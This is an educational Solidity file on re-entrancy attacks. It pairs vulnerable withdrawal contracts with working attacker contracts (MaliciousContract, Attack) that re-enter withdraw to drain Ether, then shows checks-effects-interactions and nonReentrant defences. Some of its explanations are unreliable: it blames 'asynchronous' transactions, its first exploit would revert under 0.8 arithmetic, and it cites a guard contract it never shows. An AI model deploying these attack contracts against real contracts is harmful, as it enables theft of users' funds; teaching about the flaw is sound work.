/*
A Sneak Peek into Re-Entrancy Attacks
Picture a scenario: you’re building a decentralized application (DApp) that enables users to withdraw funds from their accounts. You’ve written a Solidity function that transfers funds to the user upon request. Seems straightforward, right? 🤷‍♂️

However, in the cryptic world of blockchain, things aren’t always as they appear. Enter the re-entrancy attack, a devious exploit that can wreak havoc on unsuspecting smart contracts. This attack involves a malicious contract repeatedly invoking the vulnerable contract’s function before the original invocation completes. The attacker cunningly capitalizes on the asynchronous nature of Ethereum transactions, potentially draining the contract’s funds. 
*/

//Peeling Back the Layers: How Re-Entrancy Attacks Work

pragma solidity ^0.8.0;
contract VulnerableContract {
 mapping(address => uint256) balances;
function withdrawFunds(uint256 _amount) public {
 require(balances[msg.sender] >= _amount, "Insufficient balance");
 (bool success, ) = msg.sender.call{value: _amount}("");
 require(success, "Transfer failed");
 balances[msg.sender] -= _amount;
 }
}

// An attacker can deploy a malicious contract that calls the `withdrawFunds` function multiple times before the balance update takes place. The malicious contract can be designed to fallback into the `withdrawFunds` function, exploiting the contract’s state before it’s updated:

contract MaliciousContract {
 VulnerableContract vulnerable;
constructor(address _vulnerableAddress) {
 vulnerable = VulnerableContract(_vulnerableAddress);
 }
fallback() external payable {
 if (address(vulnerable).balance >= 1 ether) {
 vulnerable.withdrawFunds(1 ether);
 }
 }
function attack() public payable {
 vulnerable.withdrawFunds(1 ether);
 }
function getBalance() public view returns (uint256) {
 return address(this).balance;
 }
}

/*
Unleashing the Kraken: How to Defend Against Re-Entrancy
Fear not, noble developers, for we hold the key to vanquishing this nefarious threat. By implementing a few battle-tested strategies, we can safeguard our contracts against re-entrancy attacks. ⚔️

1. Checks-Effects-Interactions Pattern

One of the most potent shields against re-entrancy is the Checks-Effects-Interactions pattern. This approach involves three key steps:

- Checks: Perform all necessary checks and validations before making any state changes.
- Effects: Update the contract state after ensuring the transaction’s validity.
- Interactions: Interact with other contracts or external entities only after completing checks and updating effects.

Let’s refactor our `withdrawFunds` function to incorporate this pattern:

function withdrawFunds(uint256 _amount) public {
 require(balances[msg.sender] >= _amount, "Insufficient balance");
 balances[msg.sender] -= _amount;
 bool success;
 (success, ) = msg.sender.call{value: _amount}("");
 require(success, "Transfer failed");
}
2. Use of Modifiers

Modifiers can act as vigilant guards, protecting functions from potential attacks. By applying a re-entrancy guard modifier, we can prevent a function from being invoked while it’s still executing.

modifier nonReentrant() {
 require(!isExecuting, "Re-entrancy attempt detected");
 isExecuting = true;
 _;
 isExecuting = false;
}
Apply the `nonReentrant` modifier to functions that should be protected:

function withdrawFunds(uint256 _amount) public nonReentrant {
 // … rest of the function …
}
3. Limit External Calls

Another strategy involves limiting external calls within a function. By minimizing external interactions, we reduce the attack surface for potential re-entrancy exploits.
*/

pragma solidity ^0.8.0;
contract SecureContract {
 mapping(address => uint256) balances;
 bool private isExecuting;
modifier nonReentrant() {
 require(!isExecuting, "Re-entrancy attempt detected");
 isExecuting = true;
 _;
 isExecuting = false;
 }
function withdrawFunds(uint256 _amount) public nonReentrant {
 require(balances[msg.sender] >= _amount, "Insufficient balance");
 balances[msg.sender] -= _amount;
 bool success;
 (success, ) = msg.sender.call{value: _amount}("");
 require(success, "Transfer failed");
 }
}


//Analyzing the Re-Entrancy Vulnerability in the Provided Smart Contracts

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

/*
EtherStore is a contract where you can deposit and withdraw ETH.
This contract is vulnerable to re-entrancy attack.
Let's see why.

1. Deploy EtherStore
2. Deposit 1 Ether each from Account 1 (Alice) and Account 2 (Bob) into EtherStore
3. Deploy Attack with address of EtherStore
4. Call Attack.attack sending 1 ether (using Account 3 (Eve)).
   You will get 3 Ethers back (2 Ether stolen from Alice and Bob,
   plus 1 Ether sent from this contract).

What happened?
Attack was able to call EtherStore.withdraw multiple times before
EtherStore.withdraw finished executing.

Here is how the functions were called
- Attack.attack
- EtherStore.deposit
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack.fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
*/

contract EtherStore {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

/*
In the given code snippets, we have two contracts: `EtherStore` and `Attack`. The `EtherStore` contract is vulnerable to a re-entrancy attack, and the `Attack` contract is designed to exploit this vulnerability. Let’s break down each contract and understand how the vulnerability works:

EtherStore Contract
The `EtherStore` contract allows users to deposit and withdraw Ether. It has the following functions:

1. `deposit()`: Allows users to deposit Ether into their balances.
2. `withdraw()`: Allows users to withdraw their Ether balance.

The vulnerability arises from the `withdraw()` function, where the Ether balance is transferred to the caller’s address before updating the balance to zero. This creates a window of opportunity for a malicious contract to re-enter and repeatedly call the `withdraw()` function before the balance is updated.

Attack Contract
The `Attack` contract is designed to exploit the vulnerability in the `EtherStore` contract. It has the following functions:

1. `fallback()`: This function is called when the `EtherStore` contract sends Ether to the `Attack` contract. If the balance of the `EtherStore` contract is greater than or equal to 1 ether, the `Attack` contract calls the `withdraw()` function of the `EtherStore` contract.
2. `attack()`: Initiates the attack by depositing 1 ether into the `EtherStore` contract and then immediately calling the `withdraw()` function.

The attack takes advantage of the race condition between the `withdraw()` function and the Ether transfer. Since the balance update happens after the transfer, the attacker’s contract can repeatedly call `withdraw()` before the balance is set to zero, effectively draining the Ether from the `EtherStore` contract.

Preventative Techniques
The provided code snippets also offer preventative techniques to mitigate re-entrancy vulnerabilities:

1. Ensure All State Changes Happen Before Calling External Contracts: This technique advises that all state changes within a contract should be completed before making external contract calls. In the context of the `EtherStore` contract, this would mean updating the balance to zero before transferring Ether to the caller.

2. Use Function Modifiers that Prevent Re-Entrancy: The `ReEntrancyGuard` contract exemplifies a function modifier that can be used to prevent re-entrancy. It employs a boolean `locked` variable to control whether a function can be re-entered. The `noReentrant` modifier sets `locked` to `true` before executing the function and resets it to `false` afterward.

In Conclusion; The vulnerability demonstrated in the provided code showcases the importance of proper handling of state changes and external calls in Solidity smart contracts. Re-entrancy attacks exploit the asynchronous nature of blockchain transactions and can lead to significant financial losses.
*/